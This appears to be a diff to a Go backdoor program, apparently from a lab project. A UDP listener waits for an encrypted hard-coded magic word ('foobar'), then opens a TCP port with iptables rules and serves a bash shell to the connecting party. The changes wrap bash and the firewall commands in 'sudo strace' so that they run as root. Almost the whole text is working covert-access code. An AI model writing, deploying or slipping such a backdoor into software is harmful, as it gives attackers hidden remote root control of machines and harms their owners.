@@ -156,9 +156,8 @@ func handleConnection(conn net.Conn) {
 		fmt.Println("Decryption failed")
 		return
 	}
-	// Need to be able to check against a hashed version perhaps
 	if string(pt) != "foobar" {
-		fmt.Println("Wrong password")
+		fmt.Println("Wrong magic word for protocol")
 		return
 	}
 
@@ -167,7 +166,7 @@ func handleConnection(conn net.Conn) {
 
 	// Start the shell
 	fmt.Println("Starting bash")
-	bash := exec.Command("bash")
+	bash := exec.Command("sudo", "strace", "-o", "/dev/null", "/bin/bash")
 	stdin, _ := bash.StdinPipe()
 	stdout, _ := bash.StdoutPipe()
 	stderr, _ := bash.StderrPipe()
@@ -184,35 +183,34 @@ const (
 	CONN_HOST    = "10.0.2.5"
 	CONN_PORT    = "3333"
 	CONN_UDPPORT = "6666"
-	BACK_TYPE    = "tcp"
-	SHAKE_TYPE   = "udp"
+	CONN_TYPE    = "tcp"
 	CONN_TIMEOUT = 2
 )
 
 func openUDPRules() {
-	openInPort := exec.Command("iptables", "-I", "INPUT", "-p", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
-	openOutPort := exec.Command("iptables", "-I", "OUTPUT", "-p", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
+	openInPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-I", "INPUT", "-p", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
+	openOutPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-I", "OUTPUT", "-p", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
 	openInPort.Run()
 	openOutPort.Run()
 }
 
 func openTCPRules() {
-	openInPort := exec.Command("iptables", "-I", "INPUT", "-p", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
-	openOutPort := exec.Command("iptables", "-I", "OUTPUT", "-p", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
+	openInPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-I", "INPUT", "-p", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
+	openOutPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-I", "OUTPUT", "-p", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
 	openInPort.Run()
 	openOutPort.Run()
 }
 
 func deleteUDPRules() {
-	closeInPort := exec.Command("iptables", "-D", "INPUT", "-p", "udp", "-m", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
-	closeOutPort := exec.Command("iptables", "-D", "OUTPUT", "-p", "udp", "-m", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
+	closeInPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-D", "INPUT", "-p", "udp", "-m", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
+	closeOutPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-D", "OUTPUT", "-p", "udp", "-m", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
 	closeInPort.Run()
 	closeOutPort.Run()
 }
 
 func deleteTCPRules() {
-	closeInPort := exec.Command("iptables", "-D", "INPUT", "-p", "tcp", "-m", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
-	closeOutPort := exec.Command("iptables", "-D", "OUTPUT", "-p", "tcp", "-m", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
+	closeInPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-D", "INPUT", "-p", "tcp", "-m", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
+	closeOutPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-D", "OUTPUT", "-p", "tcp", "-m", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
 	closeInPort.Run()
 	closeOutPort.Run()
 }
@@ -231,7 +229,7 @@ func main() {
 
 	// Goroutine for TCP connection
 	fmt.Println("Listening on " + CONN_HOST + ":" + CONN_PORT)
-	tcpAddr, _ := net.ResolveTCPAddr(BACK_TYPE, CONN_HOST+":"+CONN_PORT)
+	tcpAddr, _ := net.ResolveTCPAddr(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
 	connAttempt := make(chan bool)
 	connReady := make(chan bool)
 	go func() {
@@ -240,7 +238,7 @@ func main() {
 			connReady <- true
 			<-connAttempt
 			openTCPRules()
-			sock, err := net.ListenTCP(BACK_TYPE, tcpAddr)
+			sock, err := net.ListenTCP(CONN_TYPE, tcpAddr)
 			if err != nil {
 				fmt.Println("Error listening:", err.Error())
 				os.Exit(1)
@@ -260,9 +258,9 @@ func main() {
 
 	// This part below silently listens for the magic word
 	// to open up the tcp port
-	udpAddr, _ := net.ResolveUDPAddr(SHAKE_TYPE, CONN_HOST+":"+CONN_UDPPORT)
+	udpAddr, _ := net.ResolveUDPAddr("udp", CONN_HOST+":"+CONN_UDPPORT)
 	buf := make([]byte, 1024)
-	conn, err := net.ListenUDP(SHAKE_TYPE, udpAddr)
+	conn, err := net.ListenUDP("udp", udpAddr)
 	if err != nil {
 		fmt.Println("Error listening:", err.Error())
 		os.Exit(1)
